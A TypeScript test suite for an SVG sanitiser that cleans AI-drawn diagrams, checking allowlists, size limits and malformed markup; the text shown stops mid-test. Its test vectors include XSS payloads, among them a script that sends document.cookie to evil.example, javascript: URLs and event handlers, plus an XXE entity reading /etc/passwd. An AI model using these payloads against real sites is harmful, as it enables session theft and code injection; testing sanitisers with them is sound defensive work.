import { test } from "node:test";
import assert from "node:assert/strict";
import { sanitizeSvg } from "./svgSanitize";

const OPEN = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 320">';
/** A drawing around `inner`, with one shape of its own so there is always something left to show. */
const wrap = (inner: string) => `${OPEN}${inner}<rect x="0" y="0" width="10" height="10" fill="#16A34A"/></svg>`;

// The lists again, written out on their own, so a mistake in the module's
// lists can't also hide in the check.
const OK_ELEMENTS = "svg g defs title desc linearGradient radialGradient stop clipPath rect circle ellipse line polyline polygon path text tspan".split(" ");
const OK_ATTRIBUTES = (
  "viewBox width height x y x1 y1 x2 y2 cx cy r rx ry fx fy d points fill stroke stroke-width stroke-linecap " +
  "stroke-linejoin stroke-dasharray stroke-opacity fill-opacity fill-rule opacity transform font-size font-weight " +
  "font-family font-style text-anchor dominant-baseline letter-spacing offset stop-color stop-opacity gradientUnits " +
  "gradientTransform clip-path id preserveAspectRatio"
).split(" ");

type Tag = { name: string; attrs: [string, string][]; end: boolean };

/** Every tag in well-formed, double-quoted markup like ours, in order. */
function tagsOf(s: string): Tag[] {
  return [...s.matchAll(/<(\/?)([A-Za-z][\w:-]*)((?:\s+[\w:-]+="[^"]*")*)\s*\/?>/g)].map((m) => ({
    end: m[1] === "/",
    name: m[2],
    attrs: [...m[3].matchAll(/([\w:-]+)="([^"]*)"/g)].map((a) => [a[1], a[2]] as [string, string]),
  }));
}

/**
 * What every non-null result must be: nothing but allowlisted tags with
 * allowlisted attributes holding plain values, escaped text between them,
 * and a fixed point of the sanitiser.
 */
function assertSafe(out: string, label = "") {
  // The markup alone: text may say "onerror=" or "javascript:" once escaped, and that is only text.
  const markup = (out.match(/<[^>]*>/g) ?? []).join("");
  for (const bad of [/<script/i, /<style/i, /<foreignObject/i, /<image/i, /<use[\s/>]/i, /<a[\s/>]/i, /<iframe/i, /<animate/i, /<set[\s/>]/i, /<!/, /<\?/, /\son[a-z]*\s*=/i, /href/i, /javascript/i]) {
    assert.doesNotMatch(markup, bad, `${label}: ${bad}`);
  }
  assert.match(out, /^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg" viewBox="[-\d. e+]+" /, label);
  assert.ok(out.endsWith("</svg>"), label);
  const tags = tagsOf(out);
  for (const t of tags) {
    assert.ok(OK_ELEMENTS.includes(t.name), `${label}: element ${t.name}`);
    for (const [k, v] of t.attrs) {
      if (k === "xmlns" && t.name === "svg") continue;
      assert.ok(OK_ATTRIBUTES.includes(k), `${label}: attribute ${k}`);
      assert.match(v, /^[A-Za-z0-9 #%(),.+_-]+$/, `${label}: ${k}="${v}"`);
      assert.doesNotMatch(v, /javascript|data:|http|expression/i, `${label}: ${k}="${v}"`);
      if (/url/i.test(v)) assert.match(v, /^(?:[^u]*url\(#[A-Za-z][\w-]*\))+[^u]*$/, `${label}: ${k}="${v}"`);
    }
  }
  // Take the tags away and only text is left: no raw < or >, no entity but the four we write.
  const text = out.replace(/<\/?[A-Za-z][\w:-]*(?:\s+[\w:-]+="[^"]*")*\s*\/?>/g, "");
  assert.doesNotMatch(text, /[<>]/, `${label}: stray markup`);
  assert.doesNotMatch(text.replace(/&(amp|lt|gt|quot);/g, ""), /&/, `${label}: stray entity`);
  // Balanced, and every opened element closed in order.
  const stack: string[] = [];
  for (const m of out.matchAll(/<(\/?)([A-Za-z][\w:-]*)(?:\s+[\w:-]+="[^"]*")*\s*(\/?)>/g)) {
    if (m[3]) continue;
    if (m[1]) assert.equal(stack.pop(), m[2], `${label}: nesting`);
    else stack.push(m[2]);
  }
  assert.equal(stack.length, 0, `${label}: unclosed`);
  assert.equal(sanitizeSvg(out), out, `${label}: not a fixed point`);
}

/** Sanitises, insists something came back, checks it is safe. */
function clean(raw: string, label = raw.slice(0, 80)): string {
  const out = sanitizeSvg(raw);
  assert.ok(out, `expected a drawing: ${label}`);
  assertSafe(out, label);
  return out;
}

// A drawing the way Claude writes one: declaration, comments, defs with
// gradients and a clip path, groups with transforms, every kind of shape,
// labels with tspans and an entity.
const CAGE = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 480 320" width="480" height="320" font-family="system-ui, sans-serif">
  <title>Box cricket cage: zones</title>
  <desc>Top view of a 30 by 15 metre cage</desc>
  <defs>
    <linearGradient id="turf" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#16A34A"/>
      <stop offset="100%" stop-color="#15803D"/>
    </linearGradient>
    <radialGradient id="glow" cx="50%" cy="50%" r="50%" fx="45%" fy="45%" gradientUnits="objectBoundingBox">
      <stop offset="0" stop-color="#F59E0B" stop-opacity="0.6"/>
      <stop offset="1" stop-color="#F59E0B" stop-opacity="0"/>
    </radialGradient>
    <clipPath id="cage-clip">
      <rect x="40" y="40" width="400" height="220" rx="12"/>
    </clipPath>
  </defs>
  <rect width="480" height="320" fill="#FFFFFF"/>
  <!-- the cage -->
  <g clip-path="url(#cage-clip)">
    <rect x="40" y="40" width="400" height="220" fill="url(#turf)"/>
    <rect x="200" y="120" width="80" height="60" fill="#DCFCE7" stroke="#E5E7EB" stroke-width="2"/>
    <line x1="240" y1="40" x2="240" y2="260" stroke="#FFFFFF" stroke-width="1.5" stroke-dasharray="6 4" opacity="0.7"/>
    <circle cx="240" cy="150" r="60" fill="url(#glow)"/>
  </g>
  <rect x="40" y="40" width="400" height="220" rx="12" ry="12" fill="none" stroke="#1D1D1F" stroke-width="3"/>
  <g transform="translate(240 150) scale(1.2)">
    <ellipse cx="0" cy="0" rx="6" ry="4" fill="#F59E0B"/>
    <polyline points="-30,-20 0,0 30,-20" fill="none" stroke="#0EA5E9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
  </g>
  <polygon points="430,150 418,144 418,156" fill="#1D1D1F" fill-rule="evenodd"/>
  <path d="M60 280 H420 M60 274 V286
           M420 274 V286" stroke="#6B7280" stroke-width="1.5" fill="none" stroke-opacity="0.9"/>
  <text x="240" y="300" text-anchor="middle" font-size="13" fill="#6B7280">30 m</text>
  <text x="240" y="30" text-anchor="middle" font-size="14" font-weight="600" fill="#1D1D1F">Bowling <tspan fill="#16A34A" font-style="italic">&amp; batting</tspan></text>
  <text x="20" y="150" font-size="12" fill="#6B7280" fill-opacity="1" dominant-baseline="middle" transform="rotate(-90 20 150)" letter-spacing="0.5">15 m</text>
</svg>`;

test("a real drawing comes through whole: every element, attribute and label", () => {
  const out = clean(CAGE, "cage");
  const before = tagsOf(CAGE);
  const after = tagsOf(out);
  assert.deepEqual(after.map((t) => (t.end ? "/" : "") + t.name), before.map((t) => (t.end ? "/" : "") + t.name));
  before.forEach((t, k) => {
    // Path data has its line breaks folded into spaces; the xlink namespace goes (nothing may use it).
    const want = t.attrs.filter(([n]) => n !== "xmlns:xlink").map(([n, v]): [string, string] => [n, v.replace(/\s+/g, " ")]);
    const got = after[k].attrs;
    if (t.name === "svg" && !t.end) {
      assert.deepEqual(new Map(got), new Map(want), "root attributes");
    } else assert.deepEqual(got, want, `${t.name} #${k}`);
  });
  for (const label of ["Box cricket cage: zones", "30 m", "15 m", "Bowling <tspan", "&amp; batting", "url(#turf)", "url(#glow)", "url(#cage-clip)", 'stroke-dasharray="6 4"'])
    assert.ok(out.includes(label), label);
  // Comments and the declaration are gone.
  assert.ok(!out.includes("the cage") && !out.includes("<?xml"));
});

test("text around the drawing (code fences, chatter, a second svg) is left out", () => {
  const raw = `Here is the drawing you asked for:\n\n\`\`\`svg\n${wrap('<circle cx="5" cy="5" r="4" fill="#F59E0B"/>')}\n\`\`\`\n\nAnd another: <svg viewBox="0 0 1 1"><script>alert(1)</script></svg>`;
  const out = clean(raw);
  assert.ok(out.includes("<circle"));
  assert.ok(!out.includes("Here is") && !out.includes("```") && !out.includes("another"));
  assert.equal((out.match(/<svg/g) ?? []).length, 1);
});

test("the root: xmlns of our own, the viewBox kept, a size from the viewBox when there is none, a sans font", () => {
  const out = clean('<svg viewBox="0,0,480,320" xmlns="http://evil.example/ns" version="1.1"><rect width="1" height="1"/></svg>');
  assert.ok(out.startsWith('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 320" width="480" height="320" font-family="system-ui, sans-serif">'), out);
  assert.ok(!out.includes("evil") && !out.includes("version"));
  // The size is always the viewBox's: the model's own width and height, good or junk, are never kept
  // (an unbounded one could make the drawing taller than the chat).
  assert.match(clean('<svg viewBox="0 0 48 32" width="240" height="160px"><rect width="1" height="1"/></svg>'), /^<svg [^>]*viewBox="0 0 48 32" width="48" height="32"[ >]/);
  assert.match(clean('<svg viewBox="0 0 48 32" width="100%" height="auto"><rect width="1" height="1"/></svg>'), /^<svg [^>]*viewBox="0 0 48 32" width="48" height="32"[ >]/);
  // A font that survives is kept, and no second one is added.
  const font = clean('<svg viewBox="0 0 48 32" font-family="Arial, sans-serif"><rect width="1" height="1"/></svg>');
  assert.equal((font.match(/font-family=/g) ?? []).length, 1);
  assert.ok(font.includes('font-family="Arial, sans-serif"'));
  // A font with quotes is dropped, and the default takes its place.
  assert.ok(clean(`<svg viewBox="0 0 48 32" font-family="'Inter', sans-serif"><rect width="1" height="1"/></svg>`).includes('font-family="system-ui, sans-serif"'));
});

test("no usable viewBox, or no svg at all: null", () => {
  for (const raw of [
    '<svg width="480" height="320"><rect width="1" height="1"/></svg>',
    '<svg viewBox=""><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 480"><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 480 320 10"><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 0 320"><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 -480 320"><rect width="1" height="1"/></svg>',
    '<svg viewBox="a b c d"><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 1e999 320"><rect width="1" height="1"/></svg>',
    '<svg viewbox="0 0 480 320"><rect width="1" height="1"/></svg>',
    '<svg ViewBox="0 0 480 320"><rect width="1" height="1"/></svg>',
    '<SVG viewBox="0 0 480 320"><rect width="1" height="1"/></SVG>',
    '<svg:svg viewBox="0 0 480 320"><rect width="1" height="1"/></svg:svg>',
    "I can't draw that one.",
    "",
    "<svg",
  ]) {
    assert.equal(sanitizeSvg(raw), null, raw);
  }
  for (const raw of [undefined, null, 42, {}, ["<svg>"]]) assert.equal(sanitizeSvg(raw as unknown as string), null);
});

test("the root's size is bounded: sides of 4000 at most, between 1:3 and 3:1, else null", () => {
  const svg = (vb: string, size = "") => `<svg viewBox="${vb}"${size}><rect width="1" height="1"/></svg>`;
  const root = (out: string) => out.slice(0, out.indexOf(">") + 1);
  for (const vb of ["0 0 480 320", "0 0 4000 4000", "0 0 300 100", "0 0 100 300", "-50 -50 4000 1334", "0 0 0.5 1", "0 0 1 1"]) {
    const out = clean(svg(vb), vb);
    const [, , w, h] = vb.split(" ");
    assert.ok(root(out).includes(`viewBox="${vb}" width="${Number(w)}" height="${Number(h)}"`), `${vb}: ${root(out)}`);
  }
  for (const vb of [
    "0 0 1 100000",
    "0 0 100000 1",
    "0 0 4001 2000",
    "0 0 2000 4001",
    "0 0 301 100",
    "0 0 100 301",
    "0 0 1e5 1e5",
    "0 0 480 1e-9",
  ]) {
    assert.equal(sanitizeSvg(svg(vb)), null, vb);
  }
  // A size of the model's that would make the drawing enormous is replaced by the viewBox's.
  for (const size of [' width="1" height="99999999999999999999"', ' width="99999999999999999999" height="1"', ' width="480" height="100000px"', ' height="1e30"']) {
    const out = clean(svg("0 0 1 1", size), size);
    assert.ok(root(out).includes('viewBox="0 0 1 1" width="1" height="1"'), `${size}: ${root(out)}`);
    assert.doesNotMatch(root(out), /9999|100000|1e30/, size);
  }
  // The same bound holds for the shape the model was told to draw at any scale.
  assert.ok(clean(svg("0 0 3840 2560")).includes('width="3840" height="2560"'));
});

test("nothing left to look at: null", () => {
  for (const raw of [
    `${OPEN}</svg>`,
    '<svg viewBox="0 0 480 320"/>',
    `${OPEN}<script>alert(1)</script></svg>`,
    `${OPEN}<defs><linearGradient id="g"><stop offset="0"/></linearGradient><rect width="9" height="9"/></defs></svg>`,
    `${OPEN}<clipPath id="c"><rect width="9" height="9"/></clipPath></svg>`,
    `${OPEN}<g><g><title>Only a title</title></g></g></svg>`,
    `${OPEN}<image href="x.png" width="9" height="9"/></svg>`,
  ]) {
    assert.equal(sanitizeSvg(raw), null, raw);
  }
});

test("script, style, foreignObject, image, use, a, animation, filters and every other element go with what is inside them", () => {
  const vectors: [string, string][] = [
    ["script", '<script>alert(document.cookie)</script>'],
    ["script with type", '<script type="text/javascript">fetch("//evil.example/?c="+document.cookie)</script>'],
    ["script in CDATA", "<script><![CDATA[ if (a < b && c) { alert(1) } ]]></script>"],
    ["script, upper case", "<SCRIPT>alert(1)</SCRIPT>"],
    ["script, mixed case", "<ScRiPt>alert(1)</ScRiPt>"],
    ["script, prefixed", '<svg:script xmlns:svg="http://www.w3.org/2000/svg">alert(1)</svg:script>'],
    ["script, xhtml", '<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>'],
    ["style", "<style>rect { fill: url(http://evil.example/x) } @import url(//evil.example/a.css);</style>"],
    ["style in CDATA", "<style><![CDATA[ * { background: url(javascript:alert(1)) } ]]></style>"],
    ["foreignObject", '<foreignObject width="100" height="100"><div xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/><rect id="inside"/></div></foreignObject>'],
    ["foreignObject, iframe", '<foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe></foreignObject>'],
    ["image href", '<image href="https://evil.example/track.png" width="10" height="10"/>'],
    ["image xlink:href", '<image xlink:href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+" width="10" height="10"/>'],
    ["image with a child", '<image href="x.png"><rect id="inside" width="1" height="1"/></image>'],
    ["use", '<use href="#a" x="10"/>'],
    ["use external", '<use xlink:href="https://evil.example/sprite.svg#icon"/>'],
    ["a href", '<a href="javascript:alert(1)"><rect id="inside" width="99" height="99"/></a>'],
    ["a xlink:href", '<a xlink:href="javascript:alert(1)"><text x="1" y="1">Click me</text></a>'],
    ["animate", '<animate attributeName="href" to="javascript:alert(1)" begin="0s"/>'],
    ["animate on a shape", '<rect width="5" height="5"><animate attributeName="fill" values="red;blue" dur="1s"/></rect>'],
    ["animateTransform", '<animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="1s"/>'],
    ["animateMotion", '<animateMotion path="M0 0 L10 10" dur="1s"/>'],
    ["set", '<set attributeName="onmouseover" to="alert(1)"/>'],
    ["filter", '<filter id="f"><feImage href="https://evil.example/x.png"/><feGaussianBlur stdDeviation="2"/></filter>'],
    ["iframe", '<iframe src="javascript:alert(1)"></iframe>'],
    ["marker", '<marker id="m"><path id="inside" d="M0 0 L5 5"/></marker>'],
    ["pattern", '<pattern id="p" width="4" height="4"><image href="https://evil.example/p.png"/></pattern>'],
    ["mask", '<mask id="k"><rect id="inside" width="9" height="9"/></mask>'],
    ["symbol", '<symbol id="s"><rect id="inside" width="9" height="9"/></symbol>'],
    ["switch", '<switch><foreignObject><p xmlns="http://www.w3.org/1999/xhtml">x</p></foreignObject><text id="inside">y</text></switch>'],
    ["metadata", "<metadata><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"/></metadata>"],
    ["nested svg", '<svg viewBox="0 0 10 10" onload="alert(1)"><rect id="inside" width="9" height="9"/></svg>'],
    ["unknown element", '<blink><rect id="inside" width="9" height="9"/></blink>'],
    ["capitalised shape", '<Rect id="inside" width="9" height="9"/>'],
    ["shape inside a dropped group", '<switch><g><g><circle id="inside" r="4"/></g></g></switch>'],
    ["html in text", '<text x="1" y="1"><b>bold</b><img src="x" onerror="alert(1)"/></text>'],
    ["discard", '<discard begin="0s"/>'],
    ["handler element", '<handler type="application/ecmascript">alert(1)</handler>'],
    ["listener", '<listener event="click" handler="#h"/>'],
  ];
  for (const [label, inner] of vectors) {
    const out = clean(wrap(inner), label);
    assert.ok(!out.includes('id="inside"'), `${label}: a child survived`);
    for (const word of ["alert", "evil", "cookie", "javascript", "Click me", "bold", "@import"]) assert.ok(!out.includes(word), `${label}: ${word}`);
    // The drawing's own shape is still there.
    assert.ok(out.includes('<rect x="0" y="0" width="10" height="10" fill="#16A34A"/>'), label);
  }
});

test("event handlers, style, class, href and other attributes off the list are left off; the element stays", () => {
  const attrs = [
    'onload="alert(1)"', 'onLoad="alert(1)"', 'ONLOAD="alert(1)"', 'onclick="alert(1)"', 'onmouseover="alert(1)"',
    'onbegin="alert(1)"', 'onfocusin="alert(1)"', "onerror='alert(1)'", 'on="x"',
    'style="fill:red"', 'style="background:url(javascript:alert(1))"', "style=\"behavior:url(x.htc)\"",
    'href="javascript:alert(1)"', 'xlink:href="javascript:alert(1)"', 'HREF="#x"', 'xml:base="https://evil.example/"',
    'class="hero"', 'src="x"', 'filter="url(#f)"', 'mask="url(#m)"', 'marker-end="url(#m)"', 'cursor="url(x.cur)"',
    'begin="0s"', 'attributeName="href"', 'values="javascript:alert(1)"', 'xmlns="http://www.w3.org/1999/xhtml"',
    'xmlns:xlink="http://www.w3.org/1999/xlink"', 'requiredExtensions="x"', 'systemLanguage="en"', 'tabindex="0"',
    'FILL="red"', 'Fill="red"', 'data-x="1"', 'aria-label="x"', 'lang="en"', 'xml:space="preserve"',
  ];
  for (const a of attrs) {
    const out = clean(wrap(`<rect x="1" y="2" width="3" height="4" ${a}/>`), a);
    assert.ok(out.includes('<rect x="1" y="2" width="3" height="4"/>'), `${a}: ${out}`);
  }
});

test("values: javascript:, data:, http and // urls are dropped; url(#id) stays, and only where it can point at a gradient or clip", () => {
  const dropped = [
    'fill="javascript:alert(1)"', 'fill="JavaScript:alert(1)"', 'fill="java&#x09;script:alert(1)"', 'fill="vbscript:msgbox(1)"',
    'fill="data:image/svg+xml,%3Csvg%3E"', 'fill="url(data:image/png;base64,AAAA)"',
    'fill="url(http://evil.example/x.svg#a)"', 'fill="url(https://evil.example/x.svg#a)"', 'fill="url(//evil.example/x.svg#a)"',
    'fill="url(&#x23;g)"', "fill=\"url('#g')\"", 'fill="url(&quot;#g&quot;)"', 'fill="URL(#g)"', 'fill="Url(#g)"',
    'fill="url( #g )"', 'fill="url(#9g)"', 'fill="url(#)"', 'fill="url(#g) url(http://evil.example/a)"', 'fill="url(#g"',
    'stroke="url(evil.svg#g)"', 'transform="url(#g)"', 'd="url(#g)"', 'font-family="url(#g)"',
    'fill="expression(alert(1))"', 'fill="EXPRESSION(alert(1))"', 'font-family="x;background:url(http://evil.example)"',
    'fill="red\\9"', 'fill="#fff;"', 'fill="a&amp;b"', 'fill="a`b"', 'fill="http"', 'fill="a:b"', 'fill="a/b"',
    'fill="@import"', 'fill="red!important"', 'fill="{x}"', 'fill="₹"', 'fill=""', 'fill="   "', `fill="${"1".repeat(20_001)}"`,
    'id="has space"', 'id="9lives"', 'id="-x"', `id="${"a".repeat(42)}"`, 'id="a.b"',
  ];
  for (const a of dropped) {
    const out = clean(wrap(`<rect x="1" width="3" height="4" ${a}/>`), a.slice(0, 60));
    assert.ok(out.includes('<rect x="1" width="3" height="4"/>'), `${a.slice(0, 60)}: ${out.slice(0, 300)}`);
  }
  const kept = [
    'fill="url(#g)"', 'stroke="url(#g-2)"', 'clip-path="url(#clip_a)"', 'fill="url(#g) #16A34A"', 'fill="none"',
    'fill="#16a34a"', 'fill="rgb(22, 163, 74)"', 'fill="hsl(142, 76%, 36%)"', 'fill="currentColor"', 'opacity="0.5"',
    'transform="translate(10,20) rotate(-45 5 5) scale(1.5) matrix(1 0 0 1 0 0)"', 'stroke-dasharray="4 2"',
    'font-family="system-ui, -apple-system, sans-serif"', 'id="grad-1"', `id="${"a".repeat(41)}"`,
  ];
  for (const a of kept) assert.ok(clean(wrap(`<rect x="1" width="3" height="4" ${a}/>`), a).includes(`<rect x="1" width="3" height="4" ${a}/>`), a);
});

test("> inside attribute values, and single quotes, read correctly", () => {
  const out = clean(wrap(`<rect x="1" fill="a>b" y="2"/><circle cx='5' cy="6" r='7' fill='#F59E0B'/><text x="1" stroke="/>" y="9">ok</text>`));
  assert.ok(out.includes('<rect x="1" y="2"/>'), out);
  assert.ok(out.includes('<circle cx="5" cy="6" r="7" fill="#F59E0B"/>'), out);
  assert.ok(out.includes('<text x="1" y="9">ok</text>'), out);
});

test("entities: the five XML ones and character references are read and written back escaped; spelled-out markup stays text", () => {
  const out = clean(wrap('<text x="1" y="1">&lt;script&gt;alert(1)&lt;/script&gt; &#60;img src=x onerror=alert(1)&#62; &#x3C;svg onload=alert(1)&#x3E;</text>'));
  assert.ok(!/<script|<img|<svg onload/i.test(out));
  assert.ok(out.includes("&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt;"), out);
  const money = clean(wrap('<text x="1" y="1">&#8377;900 &#x20B9;1,200 &amp; up &quot;peak&quot; &apos;hrs&apos; Bat & ball &#128512;</text>'));
  assert.ok(money.includes(`₹900 ₹1,200 &amp; up &quot;peak&quot; 'hrs' Bat &amp; ball \u{1F600}`), money);
  // In an attribute, any reference is enough to drop it: a value is never decoded.
  const attr = clean(wrap('<rect width="1" height="1" fill="&#106;avascript:alert(1)" stroke="&#x6A;avascript&#58;alert(1)"/>'));
  assert.ok(attr.includes('<rect width="1" height="1"/>'), attr);
});

test("entities XML can't read, or characters it can't hold: null", () => {
  for (const ref of ["&nbsp;", "&xxe;", "&copy;", "&#0;", "&#x0;", "&#8;", "&#xD800;", "&#xDFFF;", "&#xFFFE;", "&#x110000;", "&#99999999;", "&#x1234567;", "&#;", "&#x;", "&amp"]) {
    const raw = wrap(`<text x="1" y="1">a ${ref} b</text>`);
    if (ref === "&amp") {
      // No semicolon: not a reference, just text.
      assert.ok(clean(raw).includes("a &amp;amp b"));
      continue;
    }
    assert.equal(sanitizeSvg(raw), null, ref);
  }
  // Inside an element that is dropped anyway, a bad reference still makes the whole thing malformed.
  assert.equal(sanitizeSvg(wrap("<script>&nbsp;</script>")), null);
});

test("a doctype's entities never reach the drawing; a doctype inside it is malformed", () => {
  const xxe = `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY big "${"x".repeat(100)}">]>`;
  assert.equal(sanitizeSvg(`${xxe}${wrap('<text x="1" y="1">&xxe;</text>')}`), null);
  assert.equal(sanitizeSvg(`${xxe}${wrap('<text x="1" y="1">&big;&big;</text>')}`), null);
  // A doctype before the drawing that the drawing doesn't use is just skipped.
  assert.ok(!clean(`<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">${wrap("")}`).includes("DOCTYPE"));
  for (const inner of ['<!DOCTYPE svg>', '<!ENTITY x "y">', "<!ELEMENT svg ANY>", "<!ATTLIST rect onload CDATA #IMPLIED>", "<![INCLUDE[<rect/>]]>", "<!x>"]) {
    assert.equal(sanitizeSvg(wrap(inner)), null, inner);
  }
});

test("comments, CDATA sections and processing instructions are left out; unterminated ones are malformed", () => {
  const out = clean(
    wrap(
      '<!-- <script>alert(1)</script> --><text x="1" y="1">A<![CDATA[<script>alert(2)</script>]]>B<!--x-->C</text>' +
        '<?xml-stylesheet href="https://evil.example/x.css" type="text/css"?><!----><!-- - -->',
    ),
  );
  assert.ok(out.includes(">ABC</text>"), out);
  assert.ok(!/alert|evil|stylesheet|CDATA/.test(out), out);
  for (const inner of ["<!-- open", "<![CDATA[ open", "<? open", "<!-->", "<!--->"]) {
    assert.equal(sanitizeSvg(`${OPEN}<rect width="1" height="1"/>${inner}</svg>`), null, inner);
  }
});

test("malformed markup: null", () => {
  const rect = '<rect width="1" height="1"/>';
  for (const raw of [
    `${OPEN}${rect}`, // root never closed
    `${OPEN}<g>${rect}</svg>`, // child never closed
    `${OPEN}<g>${rect}</G></svg>`, // mismatched case
    `${OPEN}<g><text>x</g></text></svg>`, // crossed
    `${OPEN}${rect}</g></svg>`, // stray end tag
    `${OPEN}<rect width="1"`, // cut off inside a tag
    `${OPEN}<rect width="1`, // cut off inside a value
    `${OPEN}<rect width=1 height="1"/></svg>`, // unquoted
    `${OPEN}<rect onload=alert(1) width="1"/></svg>`, // unquoted handler
    `${OPEN}<rect width="1" hidden/></svg>`, // no value
    `${OPEN}<rect width="1" width="2"/></svg>`, // repeated
    `${OPEN}<rect width="1" fill="red" fill="url(#x)"/></svg>`, // repeated
    `${OPEN}<rect width="1"height="1"/></svg>`, // no space between attributes
    `${OPEN}<rect width="1" fill="<script>"/></svg>`, // < in a value
    `${OPEN}<rect width ="1"/></svg>`, // not XML whitespace
    `${OPEN}<rect width="1"/></svg>`,
    `${OPEN}<text>a < b</text></svg>`, // < starting nothing
    `${OPEN}< rect/></svg>`,
    `${OPEN}<rect/ ></svg>`,
    `${OPEN}<rect width="1" / ></svg>`,
    `${OPEN}</ g></svg>`,
    `${OPEN}<1rect/></svg>`,
    `${OPEN}<scr<script>ipt>alert(1)</script></svg>`,
    `${OPEN}<rect width="1" ="2"/></svg>`,
    `${OPEN}<rect width='1"/></svg>`,
    `<svg viewBox="0 0 480 320" viewBox="0 0 1 1">${rect}</svg>`,
    `<svg viewBox="0 0 480 320"${rect}</svg>`,
  ]) {
    assert.equal(sanitizeSvg(raw), null, raw);
  }
});

test("text is kept only where it is drawn, with its whitespace folded and control characters taken out", () => {
  const out = clean(wrap('<g>stray words<text x="1" y="1">\n   Bowling\tend  \u0007\u0000\n</text>more</g><title> Cage\n plan </title>'));
  assert.ok(out.includes('<g><text x="1" y="1"> Bowling end </text></g>'), out);
  assert.ok(out.includes("<title> Cage plan </title>"), out);
  assert.ok(!out.includes("stray") && !out.includes("more"));
  // A lone surrogate is not a character: it goes too.
  assert.ok(clean(wrap('<text x="1" y="1">a\ud800b</text>')).includes(">ab</text>"));
});

test("limits: 24 levels deep and 3000 elements pass; one more, or a bigger input or output, is null", () => {
  const nest = (n: number) => `${OPEN}${"<g>".repeat(n - 2)}<rect width="1" height="1"/>${"</g>".repeat(n - 2)}</svg>`;
  clean(nest(24), "24 deep");
  assert.equal(sanitizeSvg(nest(25)), null);
  // Deep inside something dropped counts too.
  assert.equal(sanitizeSvg(wrap(`${"<script>".repeat(30)}${"</script>".repeat(30)}`)), null);
  assert.equal(sanitizeSvg(nest(100_000).slice(0, 119_000)), null);
  const many = (n: number) => `${OPEN}${'<rect width="1" height="1"/>'.repeat(n - 1)}</svg>`;
  clean(many(3000), "3000 elements");
  assert.equal(sanitizeSvg(many(3001)), null);
  assert.equal(sanitizeSvg(`${OPEN}${"<g/>".repeat(3000)}<rect width="1" height="1"/></svg>`), null);
  // Input: 120 KB at most, wherever the padding is.
  const pad = (n: number) => wrap(`<!--${"x".repeat(n)}-->`);
  const under = pad(120 * 1024 - wrap("<!---->").length);
  assert.equal(under.length, 120 * 1024);
  clean(under, "120 KB");
  assert.equal(sanitizeSvg(pad(120 * 1024)), null);
  assert.equal(sanitizeSvg(`${wrap("")}${" ".repeat(120 * 1024)}`), null);
  assert.equal(sanitizeSvg("x".repeat(10_000_000)), null);
  // Output: escaping can make text five times longer, and the cap holds there too.
  assert.equal(sanitizeSvg(wrap(`<text x="1" y="1">${"&".repeat(30_000)}</text>`)), null);
  clean(wrap(`<text x="1" y="1">${"&".repeat(20_000)}</text>`), "20k ampersands");
});

test("enormous or hostile inputs finish quickly", () => {
  const t0 = Date.now();
  const hostile = [
    `${OPEN}<rect${" ".repeat(110_000)}`,
    `${OPEN}<rect x${" ".repeat(110_000)}="1"/></svg>`,
    `${OPEN}<rect x="${"1".repeat(110_000)}"/></svg>`,
    `${OPEN}${"<!--".repeat(25_000)}`,
    `${OPEN}${"&#".repeat(55_000)}`,
    `${OPEN}${"&a".repeat(55_000)}</svg>`,
    `${OPEN}<text>${"&amp;".repeat(20_000)}</text></svg>`,
    `${OPEN}${'<path d="M0 0 L1 1"/>'.repeat(5_000)}</svg>`,
    `${"<svg ".repeat(20_000)}`,
    `<svg viewBox="${"0 ".repeat(55_000)}"></svg>`,
    `${OPEN}<rect ${Array.from({ length: 12_000 }, (_, k) => `a${k}="1"`).join(" ")}/></svg>`,
    `${OPEN}<rect ${'a="1" '.repeat(18_000)}/></svg>`,
  ];
  for (const raw of hostile) {
    assert.ok(raw.length <= 120 * 1024, `${raw.slice(0, 30)}: ${raw.length}`);
    sanitizeSvg(raw);
  }
  // A big real drawing: 2,000 paths, close to the cap.
  const big = `${OPEN}${Array.from({ length: 2000 }, (_, k) => `<path d="M${k % 480} ${k % 320} L${(k * 7) % 480} ${(k * 3) % 320} Z" fill="#16A34A"/>`).join("")}</svg>`;
  assert.ok(big.length > 80_000 && big.length < 120 * 1024, String(big.length));
  const out = clean(big, "big");
  assert.equal((out.match(/<path /g) ?? []).length, 2000);
  assert.ok(Date.now() - t0 < 3000, `${Date.now() - t0} ms`);
});

test("every vector above, run through once more: nothing unsafe in any result", () => {
  // A last sweep with the classics, so the output checks see them all together.
  const classics = [
    '<svg/onload=alert(1)>',
    '<svg viewBox="0 0 9 9" onload="alert(1)"><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 9 9"><rect width="1" height="1"/><script xlink:href="data:,alert(1)"/></svg>',
    '<svg viewBox="0 0 9 9"><a xlink:href="javascript:alert(1)"><rect width="9" height="9"/></a><circle r="1"/></svg>',
    '<svg viewBox="0 0 9 9"><rect width="1" height="1" fill="url(\'javascript:alert(1)\')"/></svg>',
    '<svg viewBox="0 0 9 9"><text x="1" y="1">javascript:alert(1)</text></svg>',
